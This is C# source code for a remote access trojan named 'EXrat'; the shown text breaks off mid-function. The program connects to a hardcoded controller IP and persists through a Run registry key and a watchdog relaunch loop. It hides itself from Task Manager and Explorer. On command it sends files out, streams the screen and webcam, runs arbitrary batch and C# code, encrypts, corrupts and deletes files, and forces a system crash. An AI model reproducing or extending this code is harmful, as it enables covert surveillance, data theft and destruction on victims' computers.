using Emgu.CV;
using Ionic.Zip;
using Microsoft.CSharp;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Automation;
using System.Windows.Forms;

namespace EXrat
{
    internal class Program
    {
        public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr hwndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);


        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("Kernel32")]
        public static extern bool SetConsoleCtrlHandler(EventHandler Handler, bool Add);
        private const int CTRL_C_EVENT = 0;

        private const int CTRL_BREAK_EVENT = 1;
        private const int CTRL_CLOSE_EVENT = 2;
        private const int CTRL_LOGOFF_EVENT = 5;
        private const int CTRL_SHUTDOWN_EVENT = 6;

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
    int Privilege,
    bool bEnablePrivilege,
    bool IsThreadPrivilege,
    out bool PreviousValue
);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            int Parameters,
            uint ValidResponseOption,
            out uint Response
        );


        [DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hWnd, int hMsg, int wParam, int lParam);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);

        [DllImport("User32.dll")]
        private static extern void DrawIcon(IntPtr hDC, int x, int y, IntPtr hIcon);

        [DllImport("user32.dll", SetLastError = false)]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);


        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString,
    int nMaxCount);

        [DllImport("USER32.DLL")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool SetWindowText(IntPtr hwnd, string lpString);

        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString,
                            int uReturnLength, int hwndCallback);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] int dwFlags, [Out] StringBuilder lpExeName, ref int lpdwSize);

        private static readonly string ConnectionIP = "192.168.137.134";
        private static readonly TcpClient client = new TcpClient();
        private static readonly Socket GF = new Socket(AddressFamily.InterNetwork,
                                            SocketType.Stream, ProtocolType.Tcp);
        private static BinaryReader binaryReader;
        private static BinaryWriter binaryWriter;

        private static readonly SpeechSynthesizer Say = new SpeechSynthesizer();
        private static readonly Random RNG = new Random();

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        private static readonly bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

        private static Thread CursorImage = new Thread(new ThreadStart(new Action(() => { })));

        private static readonly Thread invert = new Thread(new ThreadStart(() =>
        {
            while (true)
            {
                DesktopG.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.NotSourceCopy);
                Thread.Sleep(1);
            }
        }));
        private static readonly Thread invertHeadahe = new Thread(new ThreadStart(() =>
        {
            while (true)
            {
                DesktopG.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.NotSourceCopy);
                Thread.Sleep(1);
                DesktopG.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            }
        }));
        private static readonly IntPtr DesktopWindow = GetDesktopWindow();
        private static readonly IntPtr hdc = GetWindowDC(DesktopWindow);
        public static Graphics DesktopG = Graphics.FromHdc(hdc);

        private static readonly Form ImageForm = new Form();

        private static readonly Pen BlackPen = new Pen(Color.Black);

        public static float ScreenWidth = (float)System.Windows.SystemParameters.VirtualScreenWidth;
        public static float ScreenHeight = (float)System.Windows.SystemParameters.VirtualScreenHeight;
        private static readonly string ip = GetIP();
        public static StringBuilder b = new StringBuilder();

        private static IntPtr TskMgrParent = new IntPtr();
        private static IntPtr TskMgrMain = new IntPtr();
        private static IntPtr TskMgrDirectUIHWND = new IntPtr();
        private static IntPtr TskMgrListView32 = new IntPtr();
        private static IntPtr TskMgrHeader32 = new IntPtr();
        private static List<string> procList = new List<string>();

        private static IntPtr ExpCabinetWClass = new IntPtr();
        private static IntPtr ExpShellTabWindow = new IntPtr();
        private static IntPtr ExpDUIViewWND = new IntPtr();
        private static IntPtr ExpDirectUIHWND = new IntPtr();
        private static IntPtr ExpShellView = new IntPtr();
        private static IntPtr ExpTarget = new IntPtr();
        private static List<IntPtr> CabinetHandles = new List<IntPtr>();

        public static Thread Blackout = new Thread(new ThreadStart(() =>
        {
            while (true)
            {
                DesktopG.FillRectangle(Brushes.Black, 0, 0, ScreenWidth, ScreenHeight);
                Thread.Sleep(10);
            }
        }));

        private static readonly Thread HideFromDetails = new Thread(new ThreadStart(() =>
        {
            while (true)
            {
                try
                {
                    if (Process.GetProcessesByName("TaskMgr").Length != 0)
                    {

                        TskMgrParent = Process.GetProcessesByName("TaskMgr")[0].MainWindowHandle;

                        TskMgrMain = new IntPtr();
                        TskMgrDirectUIHWND = new IntPtr();
                        TskMgrListView32 = new IntPtr();
                        TskMgrHeader32 = new IntPtr();

                        while (TskMgrHeader32 == IntPtr.Zero)
                        {
                            TskMgrMain = FindWindowEx(TskMgrParent, TskMgrMain, null, null);
                            TskMgrDirectUIHWND = FindWindowEx(TskMgrMain, TskMgrDirectUIHWND, null, null);

                            TskMgrListView32 = FindWindowEx(TskMgrDirectUIHWND, TskMgrListView32, null, null);
                            while (FindWindowEx(TskMgrListView32, IntPtr.Zero, "SysListView32", null) == IntPtr.Zero)
                            {
                                TskMgrListView32 = FindWindowEx(TskMgrDirectUIHWND, TskMgrListView32, null, null);
                                Thread.Sleep(500);
                            }

                            TskMgrListView32 = FindWindowEx(TskMgrListView32, IntPtr.Zero, "SysListView32", null);
                            TskMgrHeader32 = FindWindowEx(TskMgrListView32, IntPtr.Zero, "SysHeader32", null);

                            Thread.Sleep(150);
                        }
                        Thread.Sleep(150);
                    }
                    while (Process.GetProcessesByName("TaskMgr").Length >= 1)
                    {
                        procList = GetProcessList();
                        string procName = AppDomain.CurrentDomain.FriendlyName;

                        int procIndex = GetProcessList().FindIndex(x => x.Contains(procName));
                        DeleteProcess(procIndex);
                        Thread.Sleep(1000);
                    }
                }
                catch
                {

                }
                Thread.Sleep(150);
            }
        }));


        private static readonly Thread HideFromExplorer = new Thread(new ThreadStart(() =>
        {
            while (true)
            {
                CabinetHandles = GetCabinetHandles();
                while (CabinetHandles.Count != 0)
                {
                    foreach (IntPtr CabinetHandle in CabinetHandles)
                    {
                        string Title = GetTitle(CabinetHandle);
                        if (Title == new FileInfo(Assembly.GetExecutingAssembly().Location).Directory.Name
                        || Title == Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location))
                        {
                            ExpCabinetWClass = CabinetHandle;
                            ExpShellTabWindow = FindWindowEx(ExpCabinetWClass, IntPtr.Zero, "ShellTabWindowClass", null);
                            ExpDUIViewWND = FindWindowEx(ExpShellTabWindow, IntPtr.Zero, "DUIViewWndClassName", null);
                            ExpDirectUIHWND = FindWindowEx(ExpDUIViewWND, IntPtr.Zero, "DirectUIHWND", null);

                            ExpShellView = FindWindowEx(ExpDirectUIHWND, ExpShellView, null, null);
                            for (int I = 0; I != 10 && FindWindowEx(ExpShellView, IntPtr.Zero, "SHELLDLL_DefView", null) == IntPtr.Zero; I++)
                            {
                                ExpShellView = FindWindowEx(ExpDirectUIHWND, ExpShellView, null, null);

                                Thread.Sleep(100);
                            }

                            ExpShellView = FindWindowEx(ExpShellView, IntPtr.Zero, "SHELLDLL_DefView", null);
                            ExpTarget = FindWindowEx(ExpShellView, IntPtr.Zero, "DirectUIHWND", null);

                            SendMessage(ExpTarget, 0x0082, 0, 0);
                            Thread.Sleep(100);
                        }
                    }

                    Thread.Sleep(1000);
                    IsViewingMe();
                }

            }
        }));


        [STAThread]
        private static void Main(string[] args)
        {
            Process Protect = new Process();
            Protect.StartInfo.UseShellExecute = false;
            Protect.StartInfo.CreateNoWindow = true;

            Protect.StartInfo.FileName = "cmd.exe";
            Protect.StartInfo.Arguments = "/c \"FOR /L %N IN () DO (tasklist | find /i \"" + AppDomain.CurrentDomain.FriendlyName + "\" || (start \"\" \"" + Environment.GetCommandLineArgs()[0] + "\" -killed & pause & exit))\"";
            Protect.Start();

            if (args.Length >= 1)
            {
                if (args[0] == "-killed")
                {
                    Process.GetProcessesByName("explorer").First().Kill();
                }

            }

            ImageForm.FormBorderStyle = FormBorderStyle.None;
            ImageForm.TopMost = true;
            ImageForm.ShowInTaskbar = false;
            ImageForm.Visible = false;

            if (isAdmin)
            {
                string RandomDirectory = RandomWriteDirectory(RNG);
                if (!args.Contains("-Moved") && !args.Contains("-killed"))
                {
                    Process ChangeLoc = new Process();
                    ChangeLoc.StartInfo.UseShellExecute = false;
                    ChangeLoc.StartInfo.CreateNoWindow = true;

                    ChangeLoc.StartInfo.FileName = "cmd.exe";
                    ChangeLoc.StartInfo.Arguments = "/C timeout 10 > nul & copy " + Application.ExecutablePath + " " + RandomDirectory + " & start \"\" \"" + RandomDirectory + "\\" + Path.GetFileName(Application.ExecutablePath) + "\" -Moved & exit";
                    ChangeLoc.Start();
                    Environment.Exit(0);
                }

                HideFromDetails.Start();
                HideFromExplorer.Start();

                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Explr", Application.ExecutablePath);
            }

            Application.EnableVisualStyles();

            while (!NetworkInterface.GetIsNetworkAvailable()) { Thread.Sleep(1000); }
            while (!client.Connected)
            {
                try
                {
                    client.Connect(ConnectionIP, 5000);
                    GF.Connect(ConnectionIP, 5001);
                }
                catch (Exception) { }

                Thread.Sleep(250);
            }

            NetworkStream Stream = client.GetStream();
            binaryWriter = new BinaryWriter(Stream);

            while (NetworkInterface.GetIsNetworkAvailable())
            {

                binaryReader = new BinaryReader(Stream);
                try
                {
                    string Message = binaryReader.ReadString();

                    if (Message.StartsWith("!"))
                    {

                        string Command = GetCommand(Message).ToLower();
                        string arg1 = GetArgument(Message, 1).ToLower();
                        bool TargetingMe = arg1 == Environment.UserName.ToLower() || arg1 == ip || arg1 == "all";
                        #region Tree
                        if (Command == "drives")
                        {
                            if (TargetingMe)
                            {
                                string Drivelist = "!dl ";
                                foreach (DriveInfo drive in DriveInfo.GetDrives())
                                {
                                    Drivelist = Drivelist + "&*(" + drive.Name + ")*& ";
                                }
                                binaryWriter.Write(Drivelist);
                            }

                        }

                        if (Command == "ping")
                        {
                            binaryWriter.Write("!pong " + Environment.UserName + "  " + ip + "  " + ScreenWidth + "  " + ScreenHeight + "  " + (isAdmin ? "Yes" : "No") + " ");
                        }

                        if (Command == "tree")
                        {
                            if (TargetingMe)
                            {

                                string FileFolderlist = "!tr ";
                                try
                                {
                                    foreach (DirectoryInfo f in new DirectoryInfo(GetArgument(Message, 2)).GetDirectories())
                                    {
                                        FileFolderlist = FileFolderlist + "&*(" + f.Name + ")*& ";
                                    }
                                    foreach (FileInfo f in new DirectoryInfo(GetArgument(Message, 2)).GetFiles())
                                    {
                                        FileFolderlist = FileFolderlist + "&!(" + f.Name + ")!& ";
                                    }
                                }
                                catch
                                {
                                    binaryWriter.Write("!ad");
                                }
                                binaryWriter.Write(FileFolderlist);
                            }
                        }
                        #endregion
                        #region Download files
                        if (Command == "downloadfile" && CountArguments(Message) == 3)
                        {

                            if (TargetingMe)
                            {
                                using (WebClient Wclient = new WebClient())
                                {
                                    Wclient.DownloadFile(GetArgument(Message, 2), GetArgument(Message, 3));
                                }
                            }

                        }
                        #endregion
                        #region Show a messagebox
                        if (Command == "messagebox")
                        {
                            if (TargetingMe)
                            {
                                MessageBox.Show(GetArgument(Message, 2));
                            }

                        }
                        #endregion
                        #region Processlist
                        if (Command == "proclist" &&
                            CountArguments(Message) == 1)
                        {
                            if (TargetingMe)
                            {
                                string Processnames = "";
                                foreach (Process P in Process.GetProcesses())
                                {

                                    string FilePath = ProcessPath(P.Id);
                                    string Description = GetDescription(FilePath).Replace("(", "").Replace(")", "").Replace("\"", "");
                                    string ProcessName = Path.GetFileName(FilePath).Replace("(", "").Replace(")", "").Replace("\"", "");
                                    Processnames = Processnames + "(" + "\"" + Description + "\" " + "\"" + ProcessName + "\" " + "\"" + P.Id + "\"" + ") ";
                                }

                                binaryWriter.Write("!pl " + Processnames);
                            }

                        }

                        #endregion
                        #region Say
                        if (Command == "say")
                        {
                            if (CountArguments(Message) == 2)
                            {
                                if (TargetingMe)
                                {
                                    Say.Speak(GetArgument(Message, 2));
                                }
                            }
                        }
                        #endregion
                        #region encrypt/Decrypt
                        if (Command == "encrypt" && CountArguments(Message) == 3)
                        {
                            if (TargetingMe)
                            {
                                Encrypt(GetArgument(Message, 2), GetArgument(Message, 3));
                            }
                        }
                        if (GetCommand(Message).ToLower() == "decrypt" && CountArguments(Message) == 3)
                        {
                            if (TargetingMe)
                            {
                                Decrypt(GetArgument(Message, 2), GetArgument(Message, 3));
                            }
                        }
                        #endregion
                        #region Make Folder
                        if (Command == "mfolder")
                        {
                            if (CountArguments(Message) == 2)
                            {
                                if (TargetingMe)
                                {
                                    Say.Speak(GetArgument(Message, 2));
                                }
                            }
                        }
                        #endregion
                        #region Hide
                        if (GetCommand(Message).ToLower() == "hide" && CountArguments(Message) == 2)
                        {
                            if (TargetingMe)
                            {
                                File.SetAttributes(GetArgument(Message, 2), FileAttributes.Hidden);
                            }
                        }
                        #endregion
                        #region send files
                        if (Command == "getfile" &&
                            CountArguments(Message) == 2)
                        {
                            string FileDir = GetArgument(Message, 2);

                            if (File.Exists(@FileDir))
                            {
                                if (TargetingMe)
                                {

                                    new Thread(new ThreadStart(() =>
                                    {

                                        GF.Blocking = true;
                                        GF.SendFile(FileDir);

                                        binaryWriter.Write("!sf");
                                        GF.Disconnect(true);
                                    })).Start();

                                }
                            }

                        }
                        #endregion
                        #region Control
                        if (Command == "smp" &&
                            CountArguments(Message) == 3)
                        {
                            if (TargetingMe)
                            {
                                Cursor.Position = new Point(int.Parse(GetArgument(Message, 2)), int.Parse(GetArgument(Message, 3)));
                            }
                        }
                        if (Command == "lc" &&
                            CountArguments(Message) == 1)
                        {
                            {

                                if (TargetingMe)
                                {

                                    mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)Cursor.Position.X, (uint)Cursor.Position.Y, 0, 0);
                                }
                            }
                            if (Command == "rc" &&
                                CountArguments(Message) == 1)

                            {
                                if (TargetingMe)
                                {
                                    mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)Cursor.Position.X, (uint)Cursor.Position.Y, 0, 0);
                                }
                            }
                        }
                        if (Command == "keypress")
                        {
                            if (TargetingMe)
                            {
                                SendKeys.SendWait(GetArgument(Message, 2));
                            }
                        }
                        if (Command == "showdesktop")
                        {
                            if (TargetingMe)
                            {
                                Thread ShowDesktopTh = new Thread(new ThreadStart(() =>
                                {
                                    while (true)
                                    {
                                        Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                                    Screen.PrimaryScreen.Bounds.Height);
                                        Graphics.FromImage(bmpScreenCapture).CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                                     Screen.PrimaryScreen.Bounds.Y,
                                                     0, 0,
                                                     bmpScreenCapture.Size,
                                                     CopyPixelOperation.SourceCopy);

                                        Socket client = new Socket(AddressFamily.InterNetwork,
                                SocketType.Stream, ProtocolType.Tcp);
                                        client.Connect(ip, 5002);

                                        client.Blocking = true;
                                        MemoryStream DesktopMS = new MemoryStream();

                                        bmpScreenCapture.Save(DesktopMS, ImageFormat.Bmp);

                                        NetworkStream GetDesktopNS = new NetworkStream(client);

                                        byte[] ImageBytes = DesktopMS.ToArray();

                                        GetDesktopNS.Write(ImageBytes, 0, ImageBytes.Length);
                                        client.Shutdown(SocketShutdown.Both);
                                        client.Close();

                                        binaryWriter.Write("!di ");
                                        Thread.Sleep(1000);

                                    }
                                }))
                                {
                                    IsBackground = true
                                };
                                ShowDesktopTh.Start();

                            }
                        }
                        #endregion
                        #region Set wallpaper
                        if (Command == "setwallpaper" &&
                            CountArguments(Message) == 2)
                        {

                            if (TargetingMe)
                            {
                                using (WebClient Wallpaper = new WebClient())
                                {
                                    Wallpaper.DownloadFile(GetArgument(Message, 2), "Wallpaper.bmp");
                                }
                                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                                key.SetValue(@"WallpaperStyle", "2");
                                key.SetValue(@"TileWallpaper", "0");
                                SystemParametersInfo(SPI_SETDESKWALLPAPER,
                                0,
                                "Wallpaper.bmp",
                                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
                                File.Delete("Wallpaper.bmp");
                            }
                        }
                        #endregion
                        #region Kill a process
                        if (Command == "kill")
                        {

                            if (TargetingMe)
                            {
                                try
                                {
                                    Process.GetProcessById(Convert.ToInt32(GetArgument(Message, 2))).Kill();
                                }
                                catch
                                { }
                            }
                        }
                        #endregion
                        #region Start a process
                        if (Command == "start")
                        {
                            bool hidden = false;
                            string arguments = "";

                            if (TargetingMe)
                            {
                                if (CountArguments(Message) == 3)
                                {
                                    hidden = Convert.ToBoolean(GetArgument(Message, 3));
                                }
                                if (CountArguments(Message) == 4)
                                {
                                    arguments = GetArgument(Message, 4);
                                }
                                ProcessStartInfo psi = new ProcessStartInfo
                                {
                                    FileName = GetArgument(Message, 2),
                                    RedirectStandardOutput = hidden,
                                    RedirectStandardError = hidden,
                                    UseShellExecute = !hidden,
                                    CreateNoWindow = hidden,
                                    WindowStyle = hidden ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
                                    Arguments = ""
                                };

                                Process.Start(psi);
                            }
                        }
                        #endregion
                        #region Open drive
                        if (Command == "otray")
                        {
                            if (TargetingMe)
                            {
                                string letter = GetCD();
                                mciSendStringA("open " + letter + ": type CDaudio alias drive" + letter,
                                "", 0, 0);
                                mciSendStringA("set drive" + letter + " door open", "", 0, 0);
                            }
                        }
                        #endregion
                        #region Close drive
                        if (Command == "ctray")
                        {
                            if (TargetingMe)
                            {
                                string letter = GetCD();
                                mciSendStringA("open " + letter + ": type CDaudio alias drive" + letter,
                                "", 0, 0);
                                mciSendStringA("set drive" + letter + " door closed", "", 0, 0);

                            }
                        }
                        #endregion
                        #region Behind The Screen
                        if (Command == "capture"
                && CountArguments(Message) == 1)
                        {
                            if (TargetingMe)
                            {
                                Thread Capture = new Thread(new ThreadStart(() =>
                                {


                                    while (true)
                                    {
                                        try
                                        {
                                            Socket client = new Socket(AddressFamily.InterNetwork,
                                    SocketType.Stream, ProtocolType.Tcp);
                                            client.Connect(ip, 5003);

                                            client.Blocking = true;

                                            VideoCapture VC = new VideoCapture();
                                            Image IM = VC.QueryFrame().Bitmap;

                                            using (MemoryStream ms = new MemoryStream())
                                            {

                                                IM.Save(ms, ImageFormat.Bmp);

                                                using (NetworkStream NetStream = new NetworkStream(client))
                                                {
                                                    NetStream.Write(ms.ToArray(), 0, ms.ToArray().Length);
                                                }

                                            }
                                            VC.Dispose();
                                            client.Shutdown(SocketShutdown.Both);
                                            client.Close();

                                            binaryWriter.Write("!cs ");
                                        }
                                        catch
                                        {

                                        }
                                        Thread.Sleep(1000);
                                    }
                                }))
                                {
                                    IsBackground = true
                                };
                                Capture.Start();
                            }
                        }
                        #endregion
                        #region Open a chat
                        if (Command == "chat"
                            && CountArguments(Message) == 1)
                        {
                            Application.Run(new Form());
                        }
                        #endregion
                        #region Mouse Draw
                        if (Command == "mousedraw")
                        {

                            if (TargetingMe)
                            {
                                using (WebClient IconWC = new WebClient())
                                {
                                    if (CursorImage.IsAlive == false)
                                    {

                                        Bitmap image = new Bitmap(new MemoryStream(IconWC.DownloadData(GetArgument(Message, 2))));
                                        CursorImage = new Thread(new ThreadStart(new Action(() =>
                                        {
                                            while (true)
                                            {
                                                DesktopG.DrawImage(image, Cursor.Position.X - (image.Width / 2), Cursor.Position.Y - (image.Height / 2), image.Width, image.Height);

                                                Thread.Sleep(20);

                                            }
                                        })));
                                        CursorImage.Start();

                                    }
                                    else
                                    {
                                        CursorImage.Abort();
                                    }

                                }
                            }
                        }

                        #endregion
                        #region Show Image
                        if (Command == "draw" && CountArguments(Message) >= 2)
                        {

                            if (TargetingMe)
                            {
                                using (WebClient Icon = new WebClient())
                                {
                                    Image picture = Image.FromStream(new MemoryStream(Icon.DownloadData(GetArgument(Message, 2))));
                                    switch (CountArguments(Message))
                                    {
                                        case 2:
                                            DesktopG.DrawImage(picture, (ScreenWidth / 2) - (picture.Width / 2), (ScreenHeight / 2) - (picture.Height / 2), picture.Width, picture.Height);
                                            break;
                                        case 4:
                                            float ImageWidth = float.Parse(GetArgument(Message, 3));
                                            float ImageHeight = float.Parse(GetArgument(Message, 4));
                                            DesktopG.DrawImage(picture, (ScreenWidth / 2) - (ImageWidth / 2), (ScreenHeight / 2) - (ImageHeight / 2), ImageWidth, ImageHeight);
                                            break;
                                    }


                                }
                            }
                        }
                        #endregion
                        #region Invert Colors

                        if (Command == "invertcolors" &&
                        CountArguments(Message) == 1)
                        {

                            if (TargetingMe)
                            {

                                if (invert.IsAlive)
                                {
                                    invert.Abort();
                                }
                                else
                                {
                                    invert.Start();
                                }
                            }
                        }
                        #endregion
                        #region Invert Colors Headache

                        if (Command == "headache" &&
                        CountArguments(Message) == 1)
                        {

                            if (TargetingMe)
                            {
                                if (invert.IsAlive)
                                {
                                    invert.Abort();
                                }

                                if (invertHeadahe.IsAlive)
                                {
                                    invertHeadahe.Abort();
                                }
                                else
                                {
                                    invertHeadahe.Start();
                                }
                            }
                        }

                        #endregion
                        #region reverse text
                        if (Command == "reversetext" &&
                        CountArguments(Message) == 1)
                        {
                            if (TargetingMe)
                            {
                                EnumChildWindows(DesktopWindow, (IntPtr hWnd, IntPtr Iparam) =>
                                {
                                    SetWindowText(hWnd, ReverseString(GetTitle(hWnd)));
                                    return true;
                                }, IntPtr.Zero);
                            }
                        }

                        #endregion
                        #region Set All Text
                        if (Command == "settext" &&
                        CountArguments(Message) == 2)
                        {
                            if (TargetingMe)
                            {
                                EnumChildWindows(DesktopWindow, (IntPtr hWnd, IntPtr Iparam) =>
                                {
                                    SetWindowText(hWnd, GetArgument(Message, 2));
                                    return true;
                                }, IntPtr.Zero);
                            }
                        }
                        #endregion
                        #region disconnect
                        if (Command == "disconnect")
                        {
                            Environment.Exit(0);
                        }
                        #endregion
                        #region blackout
                        if (Command == "blackout" &&
                        CountArguments(Message) == 1)
                        {

                            if (TargetingMe)
                            {
                                if (!Blackout.IsAlive)
                                {
                                    Blackout.Start();
                                }
                                else
                                {
                                    Blackout.Abort();
                                }
                            }
                        }
                        #endregion
                        #region DrawText
                        if (Command == "drawstring" && CountArguments(Message) == 3)
                        {

                            if (TargetingMe)
                            {

                                SizeF TextSize;

                                TextSize = DesktopG.MeasureString("", new Font("arial", 25));

                                new Thread(new ThreadStart(() =>
                                {
                                    Stopwatch SW = new Stopwatch();
                                    SW.Start();

                                    while (SW.ElapsedMilliseconds <= Convert.ToInt32(GetArgument(Message, 3)))
                                    {

                                        DesktopG.DrawString(GetArgument(Message, 2), new Font("arial", 25), Brushes.Black, (ScreenWidth / 2) - (TextSize.Width / 2), (ScreenHeight / 2) - (TextSize.Height / 2));
                                        Thread.Sleep(1);
                                    }
                                    SW.Reset();
                                })).Start();

                            }

                        }

                        #endregion
                        #region turnOffBacklight
                        if (Command == "backlightoff" &&
                 CountArguments(Message) == 1)
                        {

                            if (TargetingMe)
                            {
                                SendMessage((IntPtr)0xFFFF, 0x112, 0xF170, 2);
                            }
                        }
                        #endregion
                        #region Run Batch
                        if (Command == "runbatch" &&
                        CountArguments(Message) == 2)
                        {

                            if (TargetingMe)
                            {
                                Process CMD = new Process();
                                CMD.StartInfo.RedirectStandardInput = true;
                                CMD.StartInfo.UseShellExecute = false;
                                CMD.StartInfo.CreateNoWindow = true;

                                CMD.StartInfo.FileName = "cmd.exe";
                                CMD.Start();

                                List<string> AllCommands = GetArgument(Message, 2).Split(new string[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                                Dictionary<string, List<string>> LabelCommands = new Dictionary<string, List<string>>();

                                List<int> LabelLineNum = new List<int>();

                                foreach (string S in AllCommands.Where(V => V.StartsWith(":")))
                                {
                                    int LocationOfLabel = AllCommands.IndexOf(S);
                                    LabelCommands.Add(S.Remove(0, 1), AllCommands.GetRange(LocationOfLabel, AllCommands.Count - LocationOfLabel));

                                }
                                int CurrentlyReading = 0;

                                using (StreamWriter SW = CMD.StandardInput)
                                {
                                    if (SW.BaseStream.CanWrite)
                                    {
                                        while (CurrentlyReading != AllCommands.Count)
                                        {

                                            if (AllCommands[CurrentlyReading].StartsWith("goto"))
                                            {
                                                try
                                                {
                                                    string LabelName = AllCommands[CurrentlyReading].Split(' ').Last();
                                                    foreach (string LabelCommand in LabelCommands.Where(V => V.Key.Equals(LabelName)).First().Value)
                                                    {
                                                        SW.WriteLine(LabelCommand);
                                                    }
                                                    CurrentlyReading = AllCommands.IndexOf(":" + LabelName);
                                                }
                                                catch
                                                {
                                                    CurrentlyReading++;
                                                }
                                            }
                                            else
                                            {
                                                SW.WriteLine(AllCommands[CurrentlyReading]);
                                                CurrentlyReading++;
                                            }
                                        }
                                    }
                                }

                            }
                        }
                        #endregion
                        #region Run C#
                        if (Command == "runcs")
                        {
                            if (TargetingMe)
                            {
                                RunCode(RunCmd(Message, 1), RunCmd(Message, 2).Split('&').Where(s => !string.IsNullOrWhiteSpace(s)).ToArray(), RunCmd(Message, 3), RunCmd(Message, 4), RunCmd(Message, 5));
                            }
                        }
                        #endregion
                        #region BSOD
                        if (Command == "bsod")
                        {
                            if (TargetingMe)
                            {
                                RtlAdjustPrivilege(19, true, false, out bool tmp1);
                                NtRaiseHardError(0xc0000022, 0, 0, 0, 6, out uint tmp2);
                            }
                        }
                        #endregion
                        #region Delete
                        if (Command == "delete")
                        {
                            if (TargetingMe)
                            {
                                try
                                {
                                    File.Delete(GetArgument(Message, 2));
                                }
                                catch { binaryWriter.Write("!ad"); }
                            }
                        }
                        #endregion
                        #region Corrupt
                        if (Command == "corrupt" && TargetingMe)
                        {
                            try
                            {

                                string Path = GetArgument(Message, 2);

                                if (Directory.Exists(Path))
                                {
                                    string[] TargetFiles = Directory.GetFiles(Path, "*.*", SearchOption.AllDirectories);
                                    foreach (string file in TargetFiles)
                                    {
                                        Corrupt(RNG, file);
                                    }

                                }
                                if (File.Exists(Path))
                                {
                                    Corrupt(RNG, Path);
                                }

                            }
                            catch { }
                        }
                        #endregion
                        #region Restart
                        if (Command == "restart")
                        {
                            if (TargetingMe)
                            {
                                Application.Restart();
                            }
                        }
                        #endregion
                        #region Remove
                        if (Command == "remove")
                        {
                            if (TargetingMe)
                            {
                                Protect.Kill();
                                ProcessStartInfo Info = new ProcessStartInfo
                                {
                                    Arguments = "/C timeout 10 > nul & Del " + Application.ExecutablePath,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    CreateNoWindow = true,
                                    FileName = "cmd.exe"
                                };
                                Process.Start(Info);
                                Environment.Exit(0);
                                Application.Exit();
                            }
                        }
                        #endregion
                    }
                }
                catch
                {
                    try
                    {
                        binaryWriter.Write("!fail");
                    }
                    catch
                    {
                        Protect.Kill();
                        Application.Restart();
                    }
                }
                Thread.Sleep(250);
            }
        }
        private static string ProcessPath(int ID)
        {
            try
            {
                int Size = -1;
                Process proc = Process.GetProcessById(ID);
                StringBuilder sb = new StringBuilder(1024);
                bool Success = QueryFullProcessImageName(proc.Handle, 0, sb, ref Size);
                if (Success)
                {
                    return sb.ToString();
                }
                else
                {
                    return new ManagementObjectSearcher("SELECT ExecutablePath FROM Win32_Process WHERE ProcessId = " + ID).Get().OfType<ManagementObject>().FirstOrDefault()["ExecutablePath"].ToString();
                }
            }
            catch { return ""; }
        }

        private static string GetCommand(string text)
        {
            try
            {
                return text.Split('!', ' ')[1].ToLower();
            }
            catch (Exception)
            {

                return "";
            }
        }

        private static string GetDescription(string file)
        {
            try
            {
